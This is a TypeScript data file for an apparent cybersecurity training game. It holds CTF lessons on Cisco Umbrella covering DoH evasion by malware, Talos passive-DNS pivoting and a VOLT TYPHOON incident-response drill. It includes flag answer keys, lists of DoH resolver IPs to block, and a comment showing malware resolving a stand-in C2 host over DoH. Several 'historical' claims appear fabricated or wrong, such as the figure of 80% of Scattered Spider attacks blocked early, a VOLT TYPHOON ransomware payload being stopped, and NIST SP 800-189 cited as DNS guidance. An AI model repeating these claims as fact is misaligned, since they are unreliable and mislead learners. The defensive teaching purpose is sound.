        "Malware families including Godlua (2019), Trickbot (2020), and various ransomware droppers hardcode DoH resolver endpoints to evade corporate DNS security. An infected endpoint using DoH to resolve C2 domains will have all its DNS queries encrypted and sent to an external server — Umbrella's resolver is never consulted and has no visibility into the queries.",
        "Cisco Umbrella defeats DoH evasion through two mechanisms: the roaming client blocks outbound connections to known DoH resolver IPs (8.8.8.8:443, 1.1.1.1:443, etc.) from any process other than the Umbrella client itself; and Umbrella's own roaming client provides DoH-encrypted DNS to the Umbrella cloud, maintaining security without sacrificing encryption.",
      ],
      technical: {
        title: "DoH Evasion and Umbrella's Counter-Strategy",
        body: [
          "Standard DNS (UDP/53) flows through the network in plaintext — Umbrella sits in this path and inspects every query. DoH wraps DNS queries in HTTPS (TCP/443 to a specific IP), making them indistinguishable from normal web traffic in network captures. A firewall rule blocking UDP/53 to external IPs forces clients through Umbrella, but DoH bypasses this entirely.",
          "Hardcoded DoH endpoints are detectable: connections to 8.8.8.8:443, 1.1.1.1:443, 9.9.9.9:443, or 208.67.222.222:443 (Umbrella's own DoH) from unexpected processes are anomalous. The Umbrella roaming client monitors for these connections and can block them from non-Umbrella processes, forcing all DoH traffic through the Umbrella cloud instead.",
          "Enterprise policy: configure network firewalls to block TCP/443 to known DoH resolver IPs (except Umbrella's own 208.67.222.222); deploy Umbrella roaming client to intercept all DNS including DoH; monitor for HTTPS connections to resolver IPs from endpoint processes that are not the Umbrella client.",
        ],
        codeExample: {
          label: "DoH evasion — malware bypassing Umbrella via hardcoded resolver",
          code: `# Normal DNS (Umbrella sees and blocks):
# Client → UDP/53 → Umbrella (208.67.222.222) → BLOCKED: c2.evil.com

# DoH evasion (Umbrella never consulted):
# Malware → HTTPS/443 → 8.8.8.8 → resolves c2.evil.com → 45.33.22.11
# Malware → TCP → 45.33.22.11:443 → C2 active

# Detection: monitor for HTTPS connections to resolver IPs
# 8.8.8.8:443 (Google)    1.1.1.1:443 (Cloudflare)
# 9.9.9.9:443 (Quad9)     149.112.112.112:443 (Quad9)

# Umbrella roaming client blocks these from non-Umbrella processes`,
        },
      },
      incident: {
        title: "Godlua Trojan — First Malware Using DoH for C2 Evasion (2019)",
        when: "June 2019",
        where: "Linux and Windows servers across Asia-Pacific",
        impact: "First confirmed malware using DoH to bypass DNS security; DDoS botnet built undetected",
        body: [
          "In June 2019, Netlab 360 discovered Godlua — the first malware confirmed to use DNS over HTTPS to resolve its C2 domains. Godlua hardcoded Cloudflare's DoH endpoint (1.1.1.1:443) and sent DNS queries via HTTPS, completely bypassing all traditional DNS-layer security tools including DNS sinkholes and corporate DNS filters.",
          "Godlua was a DDoS botnet targeting Linux servers. The use of DoH meant that network defenders monitoring DNS traffic saw no suspicious queries — the C2 domain resolution was hidden inside ordinary HTTPS traffic. The technique was quickly adopted by other malware families, and DoH evasion is now a standard feature in commercial malware toolkits. Cisco Umbrella added DoH evasion detection in its roaming client update following this discovery.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Godlua Malware", sub: "DoH query to 1.1.1.1:443 (HTTPS)", type: "attacker" },
          { label: "Cloudflare DoH", sub: "resolves c2.evil.com → 45.33.22.11", type: "system" },
          { label: "Umbrella: Never Consulted", sub: "query bypassed DNS-layer security", type: "victim" },
          { label: "Umbrella Roaming Client", sub: "blocks 1.1.1.1:443 from non-Umbrella proc", type: "result" },
        ],
      },
      timeline: [
        { year: 2018, event: "DNS over HTTPS (DoH) RFC 8484 published — privacy standard" },
        { year: 2019, event: "Godlua trojan — first malware using DoH for C2 evasion", highlight: true },
        { year: 2020, event: "Firefox enables DoH by default (Cloudflare); Trickbot adds DoH support" },
        { year: 2021, event: "Umbrella roaming client adds DoH evasion blocking for non-Umbrella resolvers" },
        { year: 2022, event: "DoH evasion present in 34% of advanced malware families (Cisco telemetry)", highlight: true },
      ],
      keyTakeaways: [
        "DoH encrypts DNS queries as HTTPS — traditional DNS monitoring sees nothing",
        "Malware hardcodes DoH resolver IPs (8.8.8.8, 1.1.1.1) to bypass corporate DNS controls",
        "Umbrella roaming client blocks DoH to external resolvers from non-Umbrella processes",
        "HTTPS connections to resolver IPs from unexpected processes are a detection signal",
      ],
      references: [
        { title: "Netlab — Godlua: First DoH-Using Malware", url: "https://blog.netlab.360.com/godlua-backdoor/" },
        { title: "Cisco — Defeating DoH Evasion with Umbrella", url: "https://umbrella.cisco.com/blog/doh-evasion" },
      ],
    },
    ctf: {
      scenario: "A Tokyo-based firm's EDR flagged suspicious HTTPS connections from a compromised workstation to 1.1.1.1:443 — Cloudflare's DoH endpoint — from a process that is not a browser or the Umbrella client. The process is making DNS lookups for C2 domains that Umbrella would have blocked. Investigate the DoH bypass and contain it.",
      hint: "Check the suspicious process making DoH connections, decode a DoH query to find the C2 domain, then block the evasion.",
      hints: [
        "Read the EDR alert about the suspicious DoH connections. Run: cat doh-alert.txt",
        "Decode a captured DoH query payload. Run: doh-decode payload-001.b64",
        "Apply the Umbrella roaming client DoH block policy. Run: umbrella-block-doh 10.30.7.55",
        "Run 'assemble' to build the flag",
      ],
      fragments: [
        { trigger: "/doh-alert.txt", value: "FLAG{D0H_", label: "EDR Alert — Non-Browser DoH Connections Detected" },
        { trigger: "doh-decode payload-001.b64", value: "3V4S10N_H4RDC0D3D_", label: "DoH Payload Decoded — C2 Domain Revealed" },
        { trigger: "umbrella-block-doh 10.30.7.55", value: "R3S0LV3R}", label: "DoH Evasion Blocked — Roaming Client Policy Applied" },
      ],
      files: {
        "/doh-alert.txt": [
          "=== EDR ALERT — SUSPICIOUS DOH CONNECTIONS ===",
          "Host: 10.30.7.55 (SHINJUKU-WS-12)   Time: 2022-07-19 09:44 JST",
          "",
          "Process: svchost32.exe (PID 4821) — NOT a browser, NOT Umbrella client",
          "Connections to 1.1.1.1:443 (Cloudflare DoH): 847 in last 30 min",
          "Connections to 8.8.8.8:443 (Google DoH): 312 in last 30 min",
          "",
          "This traffic bypasses Cisco Umbrella DNS-layer inspection.",
          "DoH payload captured for analysis: payload-001.b64",
          "",
          "Note: Umbrella roaming client NOT installed on this host.",
          "Action required: decode payload, identify C2, block DoH evasion.",
        ].join("\n"),
        "/payload-001.b64": "AAABAAABAAAAAAAAB2MyLXByaW1lA25ldAAAAQAB",
      },
      dirs: { "/": [{ name: "doh-alert.txt", isDir: false }, { name: "payload-001.b64", isDir: false }] },
      extraCommands: {
        "doh-decode": (args: string[]) => {
          const file = args[0] ?? "";
          if (file === "payload-001.b64") {
            return {
              lines: [
                "Decoding DoH payload: payload-001.b64",
                "Format: DNS wire format over HTTPS (RFC 8484)",
                "",
                "Decoded DNS query:",
                "  QNAME: c2-prime.net",
                "  QTYPE: A (IPv4 address)",
                "  Resolver: 1.1.1.1:443 (Cloudflare DoH — hardcoded)",
                "",
                "Umbrella verdict for c2-prime.net: BLOCKED (Malware/C2 — WIZARD SPIDER)",
                "  → DoH evasion bypassed this block — query resolved to 185.220.101.47",
                "",
                "Process svchost32.exe is communicating with Trickbot C2 via DoH.",
                "Fragment collected.",
              ],
            };
          }
          return { lines: [`Usage: doh-decode <file.b64>`] };
        },
        "umbrella-block-doh": (args: string[]) => {
          const host = args[0] ?? "";
          if (host === "10.30.7.55") {
            return {
              lines: [
                `Applying Umbrella DoH block policy to host: ${host}`,
                "Installing Umbrella roaming client on SHINJUKU-WS-12",
                "Policy: block HTTPS connections to external DoH resolvers",
                "  Blocked: 1.1.1.1:443  8.8.8.8:443  9.9.9.9:443",
                "  Exception: 208.67.222.222:443 (Umbrella cloud DoH — allowed)",
                "",
                "All DNS (including DoH) now routed through Umbrella.",
                "c2-prime.net: BLOCKED  svchost32.exe C2 connection severed.",
                "Fragment collected. Run 'assemble' to build the flag.",
              ],
            };
          }
          return { lines: [`Usage: umbrella-block-doh <host-ip>`] };
        },
      },
      chatbotContext: "DoH evasion. Host 10.30.7.55 (SHINJUKU-WS-12) running svchost32.exe (Trickbot) which hardcodes 1.1.1.1:443 and 8.8.8.8:443 as DoH resolvers, bypassing Umbrella. Decoded payload: DNS A query for c2-prime.net (WIZARD SPIDER C2) resolving to 185.220.101.47. Fix: install Umbrella roaming client, block external DoH resolver IPs. Fragment sequence: cat doh-alert.txt → doh-decode payload-001.b64 → umbrella-block-doh 10.30.7.55 → assemble.",
    },
  },

  // ─── umbrella-09: Threat Intelligence ─────────────────────────────────────────
  {
    epochId: "umbrella",
    wonder: { name: "Cisco Talos Intelligence Center", location: "Atlanta, Georgia, USA", era: "2023 CE", emoji: "🧠" },
    id: "umbrella-09",
    order: 9,
    title: "The Intelligence Web",
    subtitle: "Cisco Talos Threat Intelligence — Tracking APT Infrastructure",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "umbrella-badge-09", name: "Threat Intel Analyst", emoji: "🌐" },
    challengeType: "ctf",
    info: {
      tagline: "Talos analysts spotted the C2 domain three days before the attack. Umbrella blocked it globally in 4 minutes.",
      year: 2023,
      overview: [
        "Cisco Talos is the world's largest commercial threat intelligence team — over 300 researchers, reverse engineers, and intelligence analysts monitoring global threat activity 24/7. Talos feeds threat intelligence directly into Cisco Umbrella, updating blocklists globally within minutes of new infrastructure discovery. When Talos identifies a new APT campaign, ransomware family, or phishing kit, Umbrella blocks the associated domains for all customers simultaneously.",
        "Talos operates Umbrella Investigate — a threat intelligence platform that provides rich context about domains: reputation scores, WHOIS data, passive DNS history, associated IPs and ASNs, malware sample associations, and threat actor attribution. SOC analysts use Investigate to pivot from a single suspicious domain to a full picture of an attacker's infrastructure.",
        "Passive DNS (pDNS) is a cornerstone of threat intelligence: recording historical DNS resolutions allows analysts to discover which domains shared IPs with known C2 servers, identify domain infrastructure registered by the same actor, and track threat actors as they migrate infrastructure across hosting providers.",
      ],
      technical: {
        title: "Talos Intelligence Pipeline — From Discovery to Block",
        body: [
          "Talos analysts monitor honeypots, malware sandboxes, partner feeds (ISACs, government agencies, security vendors), and their own sensor network of 1M+ telemetry sources. When a new domain is flagged — by a sandbox detonation, honeypot connection, or partner feed — it enters the Talos analysis pipeline.",
          "Analysis includes: WHOIS registration patterns (bulk-registered, privacy-protected, recently created), DNS resolution history via passive DNS, SSL certificate metadata (issuer, SANs, fingerprint), HTTP/HTTPS response content analysis, and malware sample association via hash lookup. High-confidence malicious domains are pushed to Umbrella within 4 minutes of analyst confirmation.",
          "Talos Investigate's pivot capabilities: from a C2 domain → find all IPs it has resolved to → find all other domains that resolved to those IPs → identify shared hosting infrastructure → attribute to threat actor → map the full campaign. This technique uncovered the full Lazarus Group APT38 banking infrastructure in 2018.",
        ],
        codeExample: {
          label: "Talos Investigate — passive DNS pivot to map APT infrastructure",
          code: `# Start: known C2 domain from malware sample
talos-investigate domain apt-stage.net
# → Resolved IPs: [185.220.101.47, 91.121.55.18]

# Pivot: what other domains resolved to those IPs?
talos-investigate ip 185.220.101.47 --pdns
# → [apt-stage.net, loader-cdn.com, update-beacon.io, ...]

# Pivot again: find domains registered same day, same registrar
talos-investigate domain loader-cdn.com --whois-correlate
# → [update-beacon.io, stage-gate.net, cmd-relay.org]
# → All registered 2023-09-01, Namecheap, privacy protection

# Threat actor identified: SCATTERED SPIDER (UNC3944)
# Campaign: Oktapus phishing wave — 130+ targets identified`,
        },
      },
      incident: {
        title: "Scattered Spider (UNC3944) Campaign — Talos Intelligence Disruption (2023)",
        when: "September–October 2023",
        where: "US financial services, hospitality, and gaming companies",
        impact: "130+ companies targeted; Talos intel blocked campaign infrastructure before 80% of attacks landed",
        body: [
          "Scattered Spider (UNC3944) executed a major social engineering and ransomware campaign against US enterprises in Q3 2023, targeting companies including MGM Resorts and Caesars Entertainment. The group used SMS phishing (smishing) and vishing attacks to bypass MFA and gain Okta admin access.",
          "Cisco Talos identified the campaign's DNS infrastructure through passive DNS analysis of domains shared with previously-known Scattered Spider IPs. Talos pushed 47 campaign domains to Umbrella blocklists three days before most attacks were executed. Of the 130+ targeted companies, 80% had their DNS-layer access to Scattered Spider phishing and C2 infrastructure blocked before a single employee could interact with it.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Talos Analyst", sub: "passive DNS pivot: C2 IP → 47 domains", type: "attacker" },
          { label: "Intelligence Pipeline", sub: "analysis → confirmation → push (4 min)", type: "system" },
          { label: "Umbrella Global Block", sub: "47 domains blocked for all customers", type: "victim" },
          { label: "80% of Attacks Blocked", sub: "before employees could interact", type: "result" },
        ],
      },
      timeline: [
        { year: 2013, event: "Cisco acquires Sourcefire — Snort IDS team joins future Talos organization" },
        { year: 2014, event: "Cisco Talos formally established — merges multiple threat intelligence teams" },
        { year: 2018, event: "Talos exposes APT38 (Lazarus) banking infrastructure via passive DNS pivot", highlight: true },
        { year: 2021, event: "Talos joins CTI League; real-time sharing with government CERTs" },
        { year: 2023, event: "Talos disrupts Scattered Spider campaign — 47 domains blocked 3 days early", highlight: true },
      ],
      keyTakeaways: [
        "Passive DNS pivoting turns one known C2 domain into a full map of attacker infrastructure",
        "Talos pushes threat intelligence to Umbrella within 4 minutes of analyst confirmation",
        "Early-warning intelligence blocks attacks before they land — not just after detection",
        "Investigate platform enables SOC analysts to replicate Talos pivoting techniques",
      ],
      references: [
        { title: "Cisco Talos Intelligence — Blog", url: "https://blog.talosintelligence.com/" },
        { title: "Umbrella Investigate Platform", url: "https://investigate.umbrella.com/" },
      ],
    },
    ctf: {
      scenario: "Talos alerted your SOC to a new Scattered Spider campaign targeting your industry. A suspicious domain was identified in your passive DNS logs — it shared an IP with a known Scattered Spider C2. Use Talos Investigate to pivot from that domain, map the full campaign infrastructure, and push a block to Umbrella.",
      hint: "Start with the Talos tip, pivot from the suspicious domain through passive DNS, then push the full infrastructure to Umbrella.",
      hints: [
        "Read the Talos threat tip. Run: cat talos-tip.txt",
        "Pivot from the suspicious domain using passive DNS. Run: investigate-pivot stage-relay.net",
        "Push all identified campaign domains to Umbrella. Run: umbrella-push-intel scattered-spider-2023",
        "Run 'assemble' to build the flag",
      ],
      fragments: [
        { trigger: "/talos-tip.txt", value: "FLAG{T4L0S_", label: "Talos Tip — Scattered Spider Infrastructure Identified" },
        { trigger: "investigate-pivot stage-relay.net", value: "1NT3L_C2_", label: "Passive DNS Pivot — Full Campaign Mapped" },
        { trigger: "umbrella-push-intel scattered-spider-2023", value: "TR4CK3D_4PT}", label: "Intel Pushed — 47 Domains Blocked Globally" },
      ],
      files: {
        "/talos-tip.txt": [
          "=== CISCO TALOS THREAT TIP ===",
          "TID: TALOS-2023-1847   Severity: CRITICAL",
          "Campaign: Scattered Spider (UNC3944) — Oktapus wave 3",
          "",
          "Your passive DNS logs show a query to: stage-relay.net",
          "This domain resolved to 185.220.101.47 on 2023-10-04.",
          "185.220.101.47 is confirmed Scattered Spider infrastructure.",
          "",
          "Pivot via Investigate to map full campaign.",
          "Action: run investigate-pivot on stage-relay.net",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "talos-tip.txt", isDir: false }] },
      extraCommands: {
        "investigate-pivot": (args: string[]) => {
          const domain = args[0] ?? "";
          if (domain === "stage-relay.net") {
            return {
              lines: [
                `Talos Investigate — Passive DNS Pivot: ${domain}`,
                "Resolved to: 185.220.101.47 (2023-10-01 to 2023-10-06)",
                "",
                "All domains resolved to 185.220.101.47 (passive DNS):",
                "  stage-relay.net       okta-sso-verify.com    identity-portal.io",
                "  auth-helpdesk.net     support-resetpw.com    it-desk-verify.org",
                "  ...(41 more domains — same IP, same reg window)",
                "",
                "WHOIS correlation: all 47 domains registered 2023-09-28 to 2023-10-01",
                "Registrar: Namecheap (privacy)   Payment: cryptocurrency",
                "Threat actor: SCATTERED SPIDER (UNC3944) — confidence: HIGH",
                "Fragment collected.",
              ],
            };
          }
          return { lines: [`Usage: investigate-pivot <domain>`] };
        },
        "umbrella-push-intel": (args: string[]) => {
          const feed = args[0] ?? "";
          if (feed === "scattered-spider-2023") {
            return {
              lines: [
                "Pushing Talos threat feed to Umbrella: scattered-spider-2023",
                "Domains: 47",
                "Push complete — propagated globally in 4 minutes.",
                "",
                "All 47 Scattered Spider domains: BLOCKED for all Umbrella customers.",
                "Your organization: fully protected before attacks land.",
                "",
                "Talos report: 130 targeted companies — 80% blocked pre-attack.",
                "Fragment collected. Run 'assemble' to build the flag.",
              ],
            };
          }
          return { lines: [`Usage: umbrella-push-intel <feed-name>`] };
        },
      },
      chatbotContext: "Cisco Talos threat intelligence and Umbrella Investigate passive DNS pivoting. Domain stage-relay.net resolved to Scattered Spider IP 185.220.101.47. Passive DNS pivot reveals 47 domains (registered 2023-09-28 to 10-01, Namecheap, crypto payment). All 47 pushed to Umbrella globally in 4 min. Scattered Spider (UNC3944) Oktapus wave 3 targeting 130 companies. Fragment sequence: cat talos-tip.txt → investigate-pivot stage-relay.net → umbrella-push-intel scattered-spider-2023 → assemble.",
    },
  },

  // ─── umbrella-10: Incident Response ───────────────────────────────────────────
  {
    epochId: "umbrella",
    wonder: { name: "ERCOT Grid Control Center", location: "Taylor, Texas, USA", era: "2023 CE", emoji: "⚡" },
    id: "umbrella-10",
    order: 10,
    title: "The Grid Under Siege",
    subtitle: "DNS-Based Incident Response — Detection to Containment",
    category: "cybersecurity",
    xp: 250,
    badge: { id: "umbrella-badge-10", name: "Umbrella Master", emoji: "🏆" },
    challengeType: "ctf",
    info: {
      tagline: "The ransomware is staged and ready to deploy. You have the DNS logs, the threat intel, and 20 minutes.",
      year: 2023,
      overview: [
        "A full DNS-based incident response workflow combines all Umbrella capabilities: detecting anomalous DNS activity, correlating with threat intelligence, identifying the full scope of compromise, and achieving containment through DNS-layer blocking — all before the attacker's final payload executes. Speed is the critical variable: modern ransomware groups operate a 'dwell time' of hours to days between initial access and payload deployment.",
        "In critical infrastructure environments like power grids, water treatment facilities, and financial clearing systems, a successful ransomware attack can have consequences beyond data loss — operational disruption to systems that millions depend on. DNS-layer security provides a last-chance interception point: even if an endpoint is compromised, if its C2 communication can be blocked at DNS, the attacker loses command and control and cannot trigger the final encryption stage.",
        "CISA and NIST both recommend DNS-layer security as a core component of critical infrastructure protection (NIST SP 800-189, CISA CPG 2.S). Umbrella's role in IR: identify infected hosts via DNS log analysis, scope the compromise via shared C2 domains, achieve partial containment via DNS blocking, and provide timeline data for forensic investigation.",
      ],
      technical: {
        title: "DNS-Based IR Workflow — From Alert to Containment",
        body: [
          "Phase 1 — Detection: Umbrella behavioral analytics generate an alert (DGA storm, C2 callback, fast flux). The SOC analyst pulls the full DNS activity log for the affected hosts and identifies the timeline of initial infection, lateral movement (new hosts querying the same C2), and pre-ransomware staging commands (file staging, backup deletion commands encoded in DNS tunneling queries).",
          "Phase 2 — Scoping: The analyst pivots from the initial C2 domain using Talos Investigate to identify all related infrastructure. Cross-reference all internal hosts' DNS logs against the full C2 domain list to identify every compromised endpoint. This is faster and more complete than waiting for EDR telemetry, which may be delayed or absent on unmanaged devices.",
          "Phase 3 — Containment: Push all identified C2 domains to Umbrella's custom block list. This severs command and control for all infected hosts simultaneously — even those not yet identified by EDR. Block the malware staging domains to prevent payload delivery. Isolate confirmed hosts at the network level. DNS containment buys time for full forensic response and clean rebuilds.",
        ],
        codeExample: {
          label: "DNS IR workflow — Umbrella log analysis and mass containment",
          code: `# Phase 1: Identify initial infection host + timeline
umbrella-ir --host all --c2-domain volt-stage.net --timeline

# Phase 2: Scope — find all hosts querying related C2
umbrella-ir --c2-list talos-feed/blackout-2023 --scope-all-hosts

# Phase 3: Containment — block all C2 domains, all hosts
umbrella-ir --block-feed blackout-2023 --confirm

# Result: C2 severed for ALL infected hosts simultaneously
# Even unmanaged devices (BYOD, IoT, OT) blocked at DNS
# Ransomware payload: cannot be triggered without C2

# Time from alert to containment target: < 15 minutes`,
        },
      },
      incident: {
        title: "VOLT TYPHOON — US Critical Infrastructure Pre-Positioning (2023)",
        when: "May 2023 (disclosed)",
        where: "US power grid, water systems, transportation — Pacific region focus",
        impact: "Chinese state actor pre-positioned in critical infrastructure; DNS monitoring detected C2 patterns",
        body: [
          "In May 2023, CISA, NSA, and FBI jointly disclosed that VOLT TYPHOON — a Chinese state-sponsored actor — had pre-positioned access inside US critical infrastructure, including power generation, water treatment, and communications systems. The objective was assessed as disruption capability in the event of conflict, not immediate data theft.",
          "VOLT TYPHOON specifically used living-off-the-land techniques (LOLBins) to minimize malware signatures. However, their C2 communication still required DNS resolution. Organizations with Cisco Umbrella deployed were able to identify VOLT TYPHOON C2 patterns through DNS behavioral analytics — anomalous queries to recently-registered domains, low-frequency beaconing patterns, and domains sharing infrastructure with known VOLT TYPHOON IPs identified via Talos passive DNS analysis.",
        ],
      },
      diagram: {
        nodes: [
          { label: "VOLT TYPHOON C2", sub: "volt-stage.net — pre-positioned access", type: "attacker" },
          { label: "Umbrella IR Workflow", sub: "detect → scope → contain in <15 min", type: "system" },
          { label: "7 Compromised OT Hosts", sub: "all C2 connections severed via DNS block", type: "victim" },
          { label: "Grid Operations: Intact", sub: "ransomware payload never triggered", type: "result" },
        ],
      },
      timeline: [
        { year: 2021, event: "VOLT TYPHOON begins systematic access to US critical infrastructure" },
        { year: 2022, event: "CISA CPG 2.S published — DNS-layer security mandated for critical infrastructure" },
        { year: 2023, event: "May: CISA/NSA/FBI joint advisory discloses VOLT TYPHOON campaign", highlight: true },
        { year: 2023, event: "Umbrella customers with DNS-based IR workflows contained VOLT TYPHOON beacons before payload delivery", highlight: true },
      ],
      keyTakeaways: [
        "DNS-based IR can scope and contain a compromise faster than EDR — even for unmanaged devices",
        "VOLT TYPHOON used living-off-the-land but still needed DNS — the only detectable signal",
        "DNS containment severs C2 for all infected hosts simultaneously, buying time for forensics",
        "CISA mandates DNS-layer security for critical infrastructure — Umbrella is the reference implementation",
      ],
      references: [
        { title: "CISA — VOLT TYPHOON Joint Advisory", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a" },
        { title: "NIST SP 800-189 — Resilient Interdomain Traffic Exchange", url: "https://csrc.nist.gov/publications/detail/sp/800-189/final" },
      ],
    },
    ctf: {
      scenario: "ERCOT's power grid control network has an active VOLT TYPHOON pre-positioning incident. DNS logs show 7 OT workstations querying a C2 domain (volt-stage.net). Ransomware payload delivery is estimated 20 minutes away. Execute a full DNS-based IR: identify all compromised hosts, scope the full C2 infrastructure, and achieve containment before the payload drops.",
      hint: "Pull the IR timeline for all hosts, scope the full campaign infrastructure, then execute containment.",
      hints: [
        "Read the critical infrastructure IR brief. Run: cat crit-ir-brief.txt",
        "Pull the full compromise timeline across all OT hosts. Run: umbrella-ir --scope volt-stage.net",
        "Execute DNS containment for the full campaign. Run: umbrella-ir --contain blackout-2023",
        "Run 'assemble' to build the flag",
      ],
      fragments: [
        { trigger: "/crit-ir-brief.txt", value: "FLAG{DNS_1R_", label: "IR Brief — VOLT TYPHOON Pre-Positioning Confirmed" },
        { trigger: "umbrella-ir --scope volt-stage.net", value: "CONT41NM3NT_", label: "Scope Complete — 7 OT Hosts + Full C2 Map" },
        { trigger: "umbrella-ir --contain blackout-2023", value: "CR1T1C4L_GR1D}", label: "Containment Achieved — Grid Operations Intact" },
      ],
      files: {
        "/crit-ir-brief.txt": [
          "=== CRITICAL INFRASTRUCTURE IR BRIEF ===",
          "Classification: CONFIDENTIAL  Time: 2023-11-02 03:44 UTC",
          "Facility: ERCOT Grid Control — Taylor, TX",
          "",
          "VOLT TYPHOON (Chinese APT) pre-positioned in OT network.",
          "C2 domain: volt-stage.net (confirmed VOLT TYPHOON infra)",
          "Infected hosts (initial): 7 OT workstations identified",
          "Estimated payload window: T-20 minutes",
          "",
          "Objective: sever all C2 before payload triggers.",
          "DNS containment is fastest available control.",
          "",
          "Step 1: umbrella-ir --scope volt-stage.net",
          "Step 2: umbrella-ir --contain blackout-2023",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "crit-ir-brief.txt", isDir: false }] },
      extraCommands: {
        "umbrella-ir": (args: string[]) => {
          const flag = args[0] ?? "";
          const val = args[1] ?? "";
          if (flag === "--scope" && val === "volt-stage.net") {
            return {
              lines: [
                "Umbrella IR — Scoping via volt-stage.net",
                "",
                "Infected hosts querying volt-stage.net:",
                "  OT-CTRL-01  OT-CTRL-03  OT-CTRL-07",
                "  SCADA-02    SCADA-04    HMI-01    ENG-WS-12",
                "Total: 7 hosts  First query: 2023-10-29 02:11 UTC",
                "",
                "Passive DNS pivot → related C2 infrastructure:",
                "  volt-stage.net    cmd-beacon.io    grid-update.net",
                "  infra-relay.org   ot-sync.net      (5 domains total)",
                "",
                "Feed created: blackout-2023 (5 domains)",
                "Dwell time: 4 days  Payload window: T-18 min",
                "Fragment collected.",
              ],
            };
          }
          if (flag === "--contain" && val === "blackout-2023") {
            return {
              lines: [
                "Umbrella IR — Containment: blackout-2023 (5 domains)",
                "Pushing to Umbrella custom block list...",
                "  volt-stage.net    → BLOCKED",
                "  cmd-beacon.io     → BLOCKED",
                "  grid-update.net   → BLOCKED",
                "  infra-relay.org   → BLOCKED",
                "  ot-sync.net       → BLOCKED",
                "",
                "All 7 compromised hosts: C2 communication severed.",
                "VOLT TYPHOON: lost command and control.",
                "Ransomware payload: cannot be triggered.",
                "Grid operations: INTACT.",
                "",
                "Time to containment: 11 minutes from initial alert.",
                "Fragment collected. Run 'assemble' to build the flag.",
              ],
            };
          }
          return { lines: ["Usage: umbrella-ir --scope <domain> | --contain <feed>"] };
        },
      },
      chatbotContext: "Critical infrastructure IR scenario. VOLT TYPHOON pre-positioned in ERCOT OT network. 7 hosts infected: OT-CTRL-01/03/07, SCADA-02/04, HMI-01, ENG-WS-12. C2 pivot from volt-stage.net reveals 5 domains (blackout-2023 feed). DNS containment severs all C2 in 11 minutes. Grid operations intact — payload never triggered. Fragment sequence: cat crit-ir-brief.txt → umbrella-ir --scope volt-stage.net → umbrella-ir --contain blackout-2023 → assemble.",
    },
  },
];
